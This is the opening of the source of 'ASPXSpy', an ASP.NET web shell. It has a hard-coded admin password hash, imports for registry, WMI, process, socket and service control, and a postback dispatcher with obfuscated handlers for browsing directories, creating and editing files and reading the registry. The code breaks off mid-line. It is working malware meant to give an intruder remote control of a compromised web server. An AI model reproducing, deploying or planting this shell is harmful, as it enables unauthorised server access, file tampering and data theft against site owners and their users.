<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
<%@ import Namespace="System.IO"%>
<%@ import Namespace="System.Diagnostics"%>
<%@ import Namespace="System.Data"%>
<%@ import Namespace="System.Management"%>
<%@ import Namespace="System.Data.OleDb"%>
<%@ import Namespace="Microsoft.Win32"%>
<%@ import Namespace="System.Net.Sockets" %>
<%@ import Namespace="System.Net" %>
<%@ import Namespace="System.Runtime.InteropServices"%>
<%@ import Namespace="System.DirectoryServices"%>
<%@ import Namespace="System.ServiceProcess"%>
<%@ import Namespace="System.Text.RegularExpressions"%>
<%@ Import Namespace="System.Threading"%>
<%@ Import Namespace="System.Data.SqlClient"%>
<%@ import Namespace="Microsoft.VisualBasic"%>
<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<script runat="server">
/*
Thanks Snailsor,FuYu,BloodSword,Cnqing,
Code by Bin
Make in China
Blog: http://alikaptanoglu.blogspot.com
E-mail : ali_kaptanoglu@hotmail.com
*/
public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
public string vbhLn="ASPXSpy";
public int TdgGU=1;
protected OleDbConnection Dtdr=new OleDbConnection();
protected OleDbCommand Kkvb=new OleDbCommand();
public NetworkStream NS=null;
public NetworkStream NS1=null;
TcpClient tcp=new TcpClient();
TcpClient zvxm=new TcpClient();
ArrayList IVc=new ArrayList();
protected void Page_load(object sender,EventArgs e)
{
YFcNP(this);
fhAEn();
if (!pdo())
{
return;
}
if(IsPostBack)
{
string tkI=Request["__EVENTTARGET"];
string VqV=Request["__File"];
if(tkI!="")
{
switch(tkI)
{
case "Bin_Parent":
krIR(Ebgw(VqV));
break;
case "Bin_Listdir":
krIR(Ebgw(VqV));
break;
case "kRXgt":
kRXgt(Ebgw(VqV));
break;
case "Bin_Createfile":
gLKc(VqV);
break;
case "Bin_Editfile":
gLKc(VqV);
break;
case "Bin_Createdir":
stNPw(VqV);
break;
case "cYAl":
cYAl(VqV);
break;
case "ksGR":
ksGR(Ebgw(VqV));
break;
case "SJv":
SJv(VqV);
break;
case "Bin_Regread":
tpRQ(Ebgw(VqV));
break;
case "hae":
hae();
break;
case "urJG":
urJG(VqV);
break;
}
if(tkI.StartsWith("dAJTD"))
{
dAJTD(Ebgw(tkI.Replace("dAJTD","")),VqV);
}
else if(tkI.StartsWith("Tlvz"))
{
Tlvz(Ebgw(tkI.Replace("Tlvz","")),VqV);
}
else if(tkI.StartsWith("Bin_CFile